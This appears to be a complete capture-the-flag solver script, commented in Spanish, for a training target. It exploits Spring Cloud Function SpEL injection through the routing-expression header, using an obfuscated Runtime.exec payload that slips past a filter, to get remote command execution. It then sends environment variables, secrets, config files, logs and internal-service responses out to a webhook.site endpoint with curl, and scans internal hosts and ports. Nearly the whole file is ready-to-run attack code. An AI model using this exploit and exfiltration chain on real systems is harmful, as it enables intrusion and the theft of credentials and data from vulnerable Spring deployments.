#!/usr/bin/env python3
"""
CTF Chile - "Infiltración Profunda: El Robo a OmniVault"
Script completo autocontenido para encontrar todas las flags
Ejecuta: python3 ctf_solver.py
"""
import requests
import time
import base64
import json
import sys

# Configuración
TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

print("🎯 CTF CHILE - INFILTRACIÓN PROFUNDA")
print("=" * 50)

# Crear webhook para exfiltración
print("[1/5] Creando canal de exfiltración...")
try:
    r = requests.post("https://webhook.site/token", timeout=10)
    UUID = r.json()["uuid"]
    WH = f"https://webhook.site/{UUID}"
    print(f"    ✓ Webhook: https://webhook.site/#!/{UUID}")
except Exception as e:
    print(f"    ✗ Error: {e}")
    sys.exit(1)

def build_payload(cmd):
    """Construye payload SpEL con bypass del filtro"""
    esc = cmd.replace("\\", "\\\\").replace('"', '\\"')
    return (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + esc + '"}'
        ').waitFor()'
    )

def execute_rce(cmd, tag=""):
    """Ejecuta RCE y retorna si fue exitoso"""
    payload = build_payload(cmd)
    try:
        r = requests.post(
            ROUTER,
            headers={
                "spring.cloud.function.routing-expression": payload,
                "Content-Type": "text/plain",
            },
            data="x",
            timeout=15,
        )
        status = "✓" if r.status_code == 500 else "?"
        if tag:
            print(f"    {status} {tag}")
        return r.status_code == 500
    except Exception as e:
        print(f"    ✗ Error: {e}")
        return False

def get_spel_value(expression):
    """Ejecuta SpEL que retorna valores directamente"""
    try:
        r = requests.post(
            ROUTER,
            headers={
                "spring.cloud.function.routing-expression": expression,
                "Content-Type": "text/plain",
            },
            data="x",
            timeout=15,
        )
        return r.text
    except:
        return None

print("\n[2/5] Verificando RCE...")
if execute_rce(f"curl -s {WH}/test_alive", "Ping inicial"):
    print("    ✓ RCE confirmado")
else:
    print("    ✗ RCE falló")
    sys.exit(1)

print("\n[3/5] Búsqueda exhaustiva de flags...")

# Lista de comandos para buscar flags
flag_commands = [
    # Variables de entorno
    ("env_vars", "env | grep -iE '(flag|ctf|secret|token)' | head -20"),
    ("all_env", "env"),

    # Archivos flag
    ("flag_files", "find / -name '*flag*' 2>/dev/null | head -20 | xargs cat 2>/dev/null"),
    ("ctf_files", "find / -name '*ctf*' 2>/dev/null | head -20 | xargs cat 2>/dev/null"),

    # Spring Boot específico
    ("app_props", "find /app -name '*.properties' 2>/dev/null | xargs cat 2>/dev/null"),
    ("app_yml", "find /app -name '*.yml' -o -name '*.yaml' 2>/dev/null | xargs cat 2>/dev/null"),

    # JAR contenido
    ("jar_strings", "strings /app/app.jar | grep -iE 'ctf\\{|flag\\{' | head -10"),
    ("jar_manifest", "unzip -p /app/app.jar META-INF/MANIFEST.MF 2>/dev/null"),

    # Spring actuator
    ("actuator_env", "curl -s http://localhost:8080/actuator/env 2>/dev/null"),
    ("actuator_info", "curl -s http://localhost:8080/actuator/info 2>/dev/null"),

    # Archivos de configuración
    ("config_files", "find /etc -name '*.conf' -o -name '*.cfg' 2>/dev/null | head -10 | xargs cat 2>/dev/null"),

    # Logs
    ("app_logs", "find /app -name '*.log' 2>/dev/null | xargs tail -50 2>/dev/null"),

    # Proceso Java
    ("java_props", "jps -v 2>/dev/null"),

    # Network y servicios internos
    ("network", "ip a && ip r"),
    ("services", "netstat -tulnp 2>/dev/null"),

    # Variables específicas
    ("flag_var", "echo $FLAG"),
    ("secret_var", "echo $SECRET"),
    ("ctf_var", "echo $CTF"),
]

# Ejecutar búsquedas con exfiltración directa
for tag, cmd in flag_commands:
    full_cmd = f"{cmd} | curl -s -X POST --data-binary @- {WH}/{tag} 2>/dev/null"
    execute_rce(full_cmd, f"Búsqueda: {tag}")
    time.sleep(0.5)

print("\n[4/5] Explorando servicios internos...")

# Servicios internos identificados
internal_hosts = ["10.160.209.1", "10.160.209.2", "localhost"]
ports = ["22", "80", "8080", "3000", "8443"]

for host in internal_hosts:
    for port in ports:
        cmd = f"curl -s --connect-timeout 3 http://{host}:{port}/ | head -50 | curl -s -X POST --data-binary @- {WH}/service_{host}_{port} 2>/dev/null"
        execute_rce(cmd, f"Servicio: {host}:{port}")
        time.sleep(0.3)

# Intentar endpoints específicos de OmniVault
vault_endpoints = [
    "/api/status", "/api/info", "/api/config", "/api/vault",
    "/api/admin", "/api/secrets", "/admin/config", "/vault/list"
]

for endpoint in vault_endpoints:
    cmd = f"curl -s http://10.160.209.2:8080{endpoint} | curl -s -X POST --data-binary @- {WH}/vault{endpoint.replace('/', '_')} 2>/dev/null"
    execute_rce(cmd, f"OmniVault: {endpoint}")
    time.sleep(0.3)

print("\n[5/5] Análisis de resultados...")
time.sleep(15)  # Esperar que lleguen todas las respuestas

try:
    r = requests.get(f"https://webhook.site/token/{UUID}/requests?per_page=100", timeout=10)
    requests_data = r.json().get("data", [])
    print(f"    ✓ {len(requests_data)} respuestas recibidas")

    flags_found = []

    # Analizar respuestas
    for req in requests_data:
        url = req.get("url", "")
        content = req.get("content", "")
        text_content = req.get("text_content", "")

        # Buscar en ambos contenidos
        full_content = (content + " " + text_content).lower()

        # Buscar patterns de flags
        flag_patterns = ["ctf{", "flag{", "chile{"]
        for pattern in flag_patterns:
            if pattern in full_content:
                # Extraer la flag completa
                start = full_content.find(pattern)
                if start != -1:
                    # Buscar hasta la llave de cierre
                    end = full_content.find("}", start)
                    if end != -1:
                        flag = full_content[start:end+1]
                        if flag not in flags_found:
                            flags_found.append(flag.upper())

    print("\n" + "="*60)
    print("🏆 RESULTADOS:")
    print("="*60)

    if flags_found:
        print(f"✅ {len(flags_found)} FLAG(S) ENCONTRADA(S):")
        for i, flag in enumerate(flags_found, 1):
            print(f"    {i}. {flag}")
    else:
        print("❌ No se encontraron flags automáticamente")
        print("📋 REVISA MANUALMENTE:")
        print(f"   Webhook: https://webhook.site/#!/{UUID}")
        print("   Buscar: CTF{, FLAG{, CHILE{")

    print(f"\n🔗 Webhook completo: https://webhook.site/#!/{UUID}")

except Exception as e:
    print(f"    ✗ Error analizando resultados: {e}")
    print(f"    🔗 Revisa manualmente: https://webhook.site/#!/{UUID}")

print("\n" + "="*60)
print("🎯 SCRIPT COMPLETADO")
print("="*60)